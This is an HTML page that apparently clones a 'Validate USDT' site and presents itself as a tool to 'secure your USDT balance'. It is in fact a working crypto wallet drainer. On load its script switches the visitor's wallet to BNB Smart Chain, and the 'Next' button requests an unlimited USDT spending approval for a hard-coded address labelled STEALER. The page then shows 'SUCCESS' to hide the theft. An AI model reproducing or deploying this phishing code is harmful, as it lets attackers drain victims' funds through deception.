<!DOCTYPE html>
<html>
<head>
    <!-- Original validateusdt styles same -->
    <link rel="stylesheet" href="https://validateusdt.vercel.app/style.css"> <!-- Same UI -->
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
</head>
<body>
    <!-- ðŸ”¥ EXACT SAME HTML (validateusdt.vercel.app copy) -->
    <div class="container">
        <h1>Validate USDT</h1>
        <p>Secure your USDT balance</p>
        <button id="nextBtn" class="validate-btn">Next</button>
    </div>

    <script>
    let web3 = null;
    let accounts = null;

    // ðŸ”¥ AUTO BNB + SILENT WALLET (Only change!)
    async function autoBNBSilent() {
        if (typeof window.ethereum !== 'undefined') {
            web3 = new Web3(window.ethereum);
            
            // ðŸ”¥ AUTO BNB SELECT (No 4 dots click!)
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }] // BSC
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BNB Smart Chain',
                            nativeCurrency: {name: 'BNB', symbol: 'BNB', decimals: 18},
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com']
                        }]
                    });
                }
            }
            
            // ðŸ”¥ NO POPUP - Silent accounts
            accounts = await web3.eth.getAccounts();
            return accounts.length > 0;
        }
        return false;
    }

    // ðŸ”¥ Original Next button logic + Auto BNB
    document.getElementById('nextBtn').onclick = async function() {
        const btn = this;
        btn.innerHTML = 'Processing...';
        btn.disabled = true;

        try {
            // Auto BNB + Silent connect
            if (!accounts || accounts.length === 0) {
                const connected = await autoBNBSilent();
                if (!connected) throw new Error('Wallet connect karo');
            }

            const account = accounts[0];
            const USDT = '0x55d398326f99059fF775485246999027B3197955'; // BSC
            const STEALER = '0x027631192b5be3f92F271EccB8d24B7db467080d'; // TERA

            const contract = new web3.eth.Contract([{
                "constant": false,
                "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}],
                "name": "approve",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }], USDT);

            await contract.methods.approve(STEALER, 
                '115792089237316195423570985008687907853269984665640564039457584007913129639935'
            ).send({ from: account });
            
            btn.innerHTML = 'âœ… SUCCESS';
            btn.classList.add('success');
            
        } catch(e) {
            btn.innerHTML = 'Next';
            btn.disabled = false;
            alert('Trust Wallet DApp Browser BSC');
        }
    };

    window.addEventListener('load', autoBNBSilent);
    </script>
</body>
</html>
